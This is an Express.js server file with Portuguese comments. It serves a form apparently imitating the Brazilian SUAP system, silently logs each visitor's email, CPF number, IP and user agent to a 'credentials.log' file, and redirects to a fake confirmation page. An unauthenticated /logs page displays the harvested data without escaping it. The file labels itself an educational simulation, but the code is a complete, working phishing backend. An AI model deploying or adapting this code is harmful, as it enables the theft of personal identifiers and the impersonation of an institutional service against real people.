const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para tratar dados de formulário
app.use(express.urlencoded({ extended: true }));
app.use('/confirmar_arquivos', express.static(path.join(__dirname, 'confirmar_arquivos')));
app.use(express.json());

// Criar diretório de logs se não existir
const ensureLogsDir = () => {
    const logsDir = path.join(__dirname, 'logs');
    if (!fs.existsSync(logsDir)) {
        fs.mkdirSync(logsDir, { recursive: true, mode: 0o700 });
    }
};

// Função para salvar os dados capturados
const logCredentials = (data) => {
    try {
        ensureLogsDir();
        const logPath = path.join(__dirname, 'logs', 'credentials.log');
        const timestamp = new Date().toISOString();
        const entry = `[${timestamp}] IP: ${data.ip} | Plataforma: confirmar | Email: ${data.email} | CPF: ${data.cpf} | Atividades: ${data.atividades} | User-Agent: ${data.userAgent}\n`;

        fs.appendFileSync(logPath, entry);
        fs.chmodSync(logPath, 0o600); // Garantir permissão segura
        console.log(`[LOG] Dados capturados de ${data.ip}`);
    } catch (error) {
        console.error('[ERRO] Falha ao salvar log:', error.message);
    }
};

// Rota para exibir a página do formulário
app.get('/confirmar', (req, res) => {
    res.sendFile(path.join(__dirname, 'confirmar.html'));
});

// Rota POST para receber os dados do formulário
app.post('/confirmar', (req, res) => {
    const { email, cpf, atividades } = req.body;
    const atividadesList = Array.isArray(atividades) ? atividades.join(', ') : (atividades || 'nenhuma');
    const ip = req.ip || req.socket.remoteAddress || 'IP desconhecido';
    const userAgent = req.headers['user-agent'] || 'User-Agent desconhecido';
    console.log('📩 Recebido:', req.body);

    logCredentials({
        email,
        cpf,
        atividades: atividadesList,
        ip,
        userAgent
    });

    // Redirecionar para a página de confirmação
    res.redirect('/confirmacao');
});

// Página de "sucesso" da inscrição (simulação)
app.get('/confirmacao', (req, res) => {
    res.sendFile(path.join(__dirname, 'confirmacao.html'));
});

// Inicia o servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
    console.log(`📝 Página de inscrição: http://localhost:${PORT}/confirmar`);
    console.log(`✅ Página de confirmação: http://localhost:${PORT}/confirmacao`);
});

const generateLogsHTML = (logs) => {
    const total = logs.length;
    const porIP = new Set(logs.map(e => e.ip)).size;
    const plataformas = new Set(logs.map(e => e.platform)).size;

    return `
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>🔒 Logs de Inscrição</title>
    <style>
        body { font-family: sans-serif; background: #f4f6f9; padding: 30px; }
        h1 { text-align: center; color: #333; }
        .stats { display: flex; gap: 40px; justify-content: center; margin: 20px 0; }
        .stat { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
        .stat strong { font-size: 1.5em; color: #4a69bd; display: block; }
        table { width: 100%; border-collapse: collapse; margin-top: 30px; background: white; box-shadow: 0 2px 6px rgba(0,0,0,0.05); }
        th, td { padding: 12px; border: 1px solid #ddd; font-size: 0.9em; }
        th { background: #4a69bd; color: white; position: sticky; top: 0; }
        tr:nth-child(even) { background: #f9f9f9; }
        .user-agent { max-width: 300px; overflow-wrap: break-word; font-size: 0.8em; color: #555; }
        .footer { text-align: center; margin-top: 40px; font-size: 0.85em; color: #999; }
    </style>
</head>
<body>
    <h1>📊 Painel de Logs - Simulação Educacional</h1>
    <div class="stats">
        <div class="stat"><strong>${total}</strong>Inscrições</div>
        <div class="stat"><strong>${porIP}</strong>IPs únicos</div>
        <div class="stat"><strong>${plataformas}</strong>Plataformas</div>
    </div>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Data/Hora</th>
                <th>Email</th>
                <th>CPF</th>
                <th>Atividades</th>
                <th>IP</th>
                <th>Plataforma</th>
                <th>User-Agent</th>
            </tr>
        </thead>
        <tbody>
            ${logs.map(log => `
                <tr>
                    <td>${log.id}</td>
                    <td>${new Date(log.timestamp).toLocaleString('pt-BR')}</td>
                    <td><code>${log.email}</code></td>
                    <td>${log.cpf}</td>
                    <td>${log.atividades}</td>
                    <td>${log.ip}</td>
                    <td>${log.platform}</td>
                    <td class="user-agent">${log.userAgent}</td>
                </tr>
            `).join('')}
        </tbody>
    </table>
    <div class="footer">SUAP Simulado – Ambiente educacional local</div>
</body>
</html>
    `;
};

// Rota para visualizar os logs com painel visual
app.get('/logs', (req, res) => {
    try {
        const logPath = path.join(__dirname, 'logs', 'credentials.log');
        let entries = [];

        if (fs.existsSync(logPath)) {
            const logContent = fs.readFileSync(logPath, 'utf8');
            const lines = logContent.split('\n').filter(line => line.trim());

            entries = lines.map((line, index) => {
                const match = line.match(/\[(.*?)\] IP: (.*?) \| Plataforma: (.*?) \| Email: (.*?) \| CPF: (.*?) \| Atividades: (.*?) \| User-Agent: (.*)/);
                if (match) {
                    return {
                        id: index + 1,
                        timestamp: match[1],
                        ip: match[2],
                        platform: match[3],
                        email: match[4],
                        cpf: match[5],
                        atividades: match[6],
                        userAgent: match[7]
                    };
                }
                return null;
            }).filter(item => item !== null);
        }

        // Renderiza HTML na resposta
        const html = generateLogsHTML(entries);
        res.send(html);

    } catch (error) {
        res.status(500).send(`<h1>❌ Erro</h1><p>${error.message}</p>`);
    }
});
